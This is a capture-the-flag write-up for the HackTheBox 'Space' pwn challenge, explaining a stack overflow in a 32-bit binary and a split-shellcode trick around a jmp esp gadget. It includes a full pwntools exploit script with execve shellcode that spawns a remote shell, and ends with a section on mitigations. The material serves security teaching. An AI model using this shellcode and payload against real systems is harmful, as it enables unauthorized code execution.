## Overview

**Space** is a Medium-difficulty [Pwn](https://www.hackthebox.com/) challenge: a tiny 32-bit ELF with every common stack protection disabled — no PIE, no stack canary, and an executable (RWX) stack. `main()` reads 31 bytes into a stack buffer and passes it to `vuln()`, which copies it — unbounded — into a 14-byte local buffer with `strcpy()`, a classic [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html). The binary even ships a hand-placed `jmp esp` gadget as a hint toward the intended exploit path. The twist is that only 30 bytes total are controllable, too few for a normal shellcode plus padding plus a return address — solved by splitting the shellcode in two and stitching it back together with a backward jump.

## The technique

Overflow layout:

- 18 bytes of padding reach the saved return address (EIP)
- 4 bytes overwrite EIP with the address of the binary's own `jmp esp` gadget
- Only ~8 bytes remain *after* the EIP overwrite, out of the 31-byte read cap

That's 30 controllable bytes total — far short of a normal `execve("/bin/sh")` shellcode (usually 24-26 bytes) plus the 18-byte pad plus the 4-byte address.

Since `jmp esp` lands execution right after the overwritten return address, the bytes placed *after* EIP run first. But the 18 "padding" bytes placed *before* EIP are still resident in memory — they just aren't reached by a forward jump. So the shellcode is split into two pieces and joined with a backward jump:

1. **Trailer** (8 bytes, after EIP) — runs first. Sets up the `execve` syscall number and zeroes a register, then does a short backward `jmp` (2 bytes) landing back at the start of the padding region.
2. **Prefix** (18 bytes, before EIP) — runs second, having been jumped back into. Builds `"/bin//sh"` on the stack and finishes the syscall.

The prefix can't push its string data immediately: at the moment `jmp esp` fires, ESP sits only ~22 bytes above the prefix's own not-yet-executed bytes. Pushing the string first would overwrite the prefix's own tail instructions before the CPU fetches them — self-corrupting shellcode. The fix is a stack pointer relocation (`sub esp, 0x60`) as the prefix's first instruction, moving the scratch region safely below all of the payload's own code before any string bytes are pushed.

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
# 32-bit stack overflow, RWX stack, no canary/PIE. jmp-esp gadget + split shellcode.
import sys
from pwn import *

context.arch = 'i386'
context.binary = './space'

rop = ROP('./space')
eip = p32(rop.jmp_esp.address)          # hand-placed "jmp esp" gadget

# Runs FIRST -- ESP lands here right after the return-address bytes.
trailer_core = asm('''
    xor ecx, ecx
    push 0xb
    pop  eax
    cdq
''')
jmp_back = bytes([0xeb, 0xe2])          # short jmp rel8 = -30, back to prefix
trailer = trailer_core + jmp_back       # 8 bytes total

# Runs SECOND (jumped back into) -- relocate ESP before pushing the string.
prefix = asm('''
    sub esp, 0x60
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
''')                                    # 18 bytes total

payload = prefix + eip + trailer        # 18 + 4 + 8 = 30 bytes, exact budget

p = remote(sys.argv[1], int(sys.argv[2]))
p.recvuntil(b'> ')
p.send(payload)
p.interactive()                         # HTB{...}
```

```bash
python3 solve.py <ip> <port>
```

A public writeup for this exact binary came with a ready-made script that crashed against the live instance every time. Root-causing it with `gdb` (dumping memory at the exact byte where execution died) showed the same bug: the published script pushed the shell string before relocating ESP, clobbering its own tail instructions before they ran. The working exploit above was rebuilt from scratch once the actual bug was understood.

## Why it worked

Three independent protections were all disabled at once: no canary meant the overwrite was never detected, no PIE meant the `jmp esp` gadget's address was a known constant, and an executable stack meant the split shellcode could run directly off the stack once redirected there. Any single one of the three would have stopped this exact exploit.

## Fix / defense

- **Stack canaries** (`-fstack-protector-strong`) would detect the overflow before the corrupted return address is ever used.
- **A non-executable stack** (the default on modern toolchains) would block the injected shellcode from executing at all, regardless of control-flow hijack.
- **PIE + ASLR** would randomize the `jmp esp` gadget's address every run, making a hardcoded return address useless.

Any one of these mitigations independently closes this exact path — the challenge disables all three deliberately to isolate the classic stack-smashing technique.
